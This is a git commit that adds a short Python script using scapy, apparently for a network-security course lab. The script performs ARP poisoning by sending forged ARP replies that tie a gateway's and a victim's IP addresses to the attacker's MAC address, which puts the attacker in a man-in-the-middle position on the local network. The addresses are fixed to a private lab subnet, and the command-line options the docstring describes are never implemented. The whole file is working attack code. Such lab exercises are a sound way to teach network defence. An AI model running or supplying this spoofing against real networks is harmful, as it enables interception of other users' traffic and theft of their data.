a3dde44c14bfddfb7b96bdb1b6af25c2005b226d
robertwenquan <robert.wen@nyu.edu>
2015-04-16 22:36:31 -0400

    add ARP poisoning script for lab6

---
+++ network-security/lab6/arp-poisoning.py
@@ -0,0 +1,27 @@
+#!/usr/bin/python
+#
+
+"""
+  ARP poisoning using gratuious ARP requests
+
+- send gratuitous ARP to victim and gateway, 
+- with the hacker machine's MAC
+
+ -g gateway IP address
+ -v victim IP address
+ -m MAC address to poison
+
+"""
+
+import sys
+import getopt
+from scapy.all import *
+
+GATEWAY_IPADDR = '192.168.56.1'
+VICTIM_IPADDR  = '192.168.56.101'
+HACKER_MACADDR = '08:00:27:0c:c1:12'
+
+arp_pkts = Ether(dst='00:00:00:00:00:00')/ARP(op = 2, psrc = [GATEWAY_IPADDR, VICTIM_IPADDR], pdst = '0.0.0.0', hwsrc = HACKER_MACADDR)
+
+sendp(arp_pkts, iface='p7p1')
+
